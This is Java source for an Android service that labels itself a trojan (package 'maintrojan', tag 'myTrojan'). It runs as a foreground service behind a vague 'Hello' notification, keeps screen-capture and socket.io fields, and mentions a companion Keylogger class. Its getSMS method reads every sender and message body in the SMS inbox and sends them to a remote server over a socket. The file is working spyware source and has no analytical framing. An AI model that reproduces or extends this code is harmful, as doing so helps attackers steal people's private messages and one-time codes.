package com.example.maintrojan;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.net.Uri;
import android.database.Cursor;
import android.content.ContentResolver;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.net.URISyntaxException;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;

public class MyService extends Service {
    private static final String TAG = "myTrojan";
    private static final String channelID = "myTrojan";
    String MY_IP,MY_PORT ;
    private final long reconnectTime = 1*1000;
    private Socket sock=null;
    public MediaProjectionManager mProjectionManager;
    public MediaProjection mProjection;
    Capture capture;
    Handler handler = new Handler();
    Pinger pinger = new Pinger();
//    ClickEvt clickEvt = new ClickEvt();

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // NOTE: Socket connection and handlers moved to Keylogger.java to avoid duplicate connections
        // This service now only handles foreground notification
        
        NotificationChannel channel = new NotificationChannel(
                channelID,channelID, NotificationManager.IMPORTANCE_LOW
        );
        getSystemService(NotificationManager.class).createNotificationChannel(channel);
        Notification.Builder notification = new Notification.Builder(this,channelID)
                .setContentText("Hello")
                        .setContentTitle("title")
                                .setSmallIcon(R.drawable.ic_launcher_background);


        startForeground(101,notification.build());



        return super.onStartCommand(intent, flags, startId);
    }

    public void getSMS(){
        try {
            Uri uri = Uri.parse("content://sms/inbox");
            ContentResolver contentResolver = getContentResolver();
            Cursor cursor = contentResolver.query(uri,null,null,null,null);
            
            if (cursor == null) {
                 return;
            }
            
            JSONArray list = new JSONArray();
            while (cursor.moveToNext()){
                String num = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                String msg = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                try {
                    JSONObject item = new JSONObject();
                    item.put("address",num);
                    item.put("body",msg);
                    list.put(item);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
            cursor.close();
            sock.emit("sms",list);
        } catch (Exception e) {
            Log.e(TAG, "getSMS: "+e.getMessage());
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }



}
